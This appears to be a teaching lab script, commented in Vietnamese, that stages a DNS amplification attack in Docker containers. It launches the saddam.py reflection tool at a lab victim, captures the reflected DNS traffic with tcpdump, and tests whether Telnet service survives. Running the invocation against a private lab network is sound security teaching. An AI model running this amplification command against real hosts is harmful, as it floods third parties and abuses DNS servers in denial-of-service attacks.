#!/bin/bash
# Kich ban 3 (Lab 04): Tan cong DNS Amplification (Khuech dai luu luong DNS Reflector)
# Lenh PDF: sudo python saddam.py <IP_Victim> -d dns.txt:www.test.com

set -u

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_LAB="$(cd "${SCRIPT_DIR}/.." && pwd)"

CONTAINER_VICTIM="lab04_victim"
CONTAINER_ATTACKER="lab04_attacker"
CONTAINER_USER="lab04_user"
CONTAINER_DNS="lab04_dns"
IP_VICTIM="10.2.6.20"

PCAP_PATH="/tmp/lab04_sc3.pcap"
fail=0

note() { printf '\n===== %s =====\n' "$1"; }
pass() { echo "PASS: $1"; }
bad() { echo "FAIL: $1"; fail=1; }

note "[Buoc 1 & 2] Quan sat thong so TRUOC tan cong tren Victim"
echo "--- CPU / RAM (top snapshot truoc tan cong) ---"
sudo docker exec "$CONTAINER_VICTIM" top -b -n 1 | head -n 12

note "[Buoc 3] Bat tcpdump bat goi tin UDP DNS (port 53) tren Victim"
sudo docker exec "$CONTAINER_VICTIM" rm -f "$PCAP_PATH"
sudo docker exec -d "$CONTAINER_VICTIM" tcpdump -i eth0 -n -w "$PCAP_PATH" "udp port 53"

note "[Buoc 4 & 5] Attacker phat dong tan cong DNS Amplification qua Reflector (saddam.py)"
echo "Lenh thuc thi: python3 /attack/saddam.py $IP_VICTIM -d /attack/dns.txt:www.test.com -c 50"
sudo docker exec "$CONTAINER_ATTACKER" python3 /attack/saddam.py "$IP_VICTIM" -d /attack/dns.txt:www.test.com -c 50 2>/dev/null || true

note "[Buoc 6] User thu nghiem ket noi Telnet toi Victim"
if sudo docker exec "$CONTAINER_USER" nc -z -w 2 "$IP_VICTIM" 23; then
  echo "Dich vu Telnet van ket noi duoc"
else
  echo "Ket noi bi gian doan"
fi

note "[Buoc 7] Quan sat thong so TRONG KHI bi tan cong tren Victim"
echo "--- CPU / RAM trong khi tan cong ---"
sudo docker exec "$CONTAINER_VICTIM" top -b -n 1 | head -n 12

note "[Buoc 8, 9, 10] Dung tan cong, ket thuc bat goi va phan tich luu luong DNS khuech dai"
sudo docker exec "$CONTAINER_VICTIM" pkill -9 tcpdump 2>/dev/null || true
sleep 1

echo "--- Danh sach 10 goi tin DNS phan hoi do ve Victim ---"
sudo docker exec "$CONTAINER_VICTIM" tcpdump -n -r "$PCAP_PATH" -c 10 2>/dev/null || true
packet_count=$(sudo docker exec "$CONTAINER_VICTIM" tcpdump -n -r "$PCAP_PATH" 2>/dev/null | wc -l)
echo "[+] Tong so goi tin DNS Reflected bat duoc tren Victim: $packet_count goi tin"
if [[ "$packet_count" -gt 0 ]]; then
  pass "Thu thap thanh cong luu luong DNS Amplification ($packet_count goi)"
else
  bad "Khong bat duoc luu luong DNS Amplification"
fi

echo
if [[ "$fail" -eq 0 ]]; then
  echo "KET QUA KICH BAN 3 (DNS AMPLIFICATION): PASS"
else
  echo "KET QUA KICH BAN 3 (DNS AMPLIFICATION): FAIL"
fi
exit "$fail"
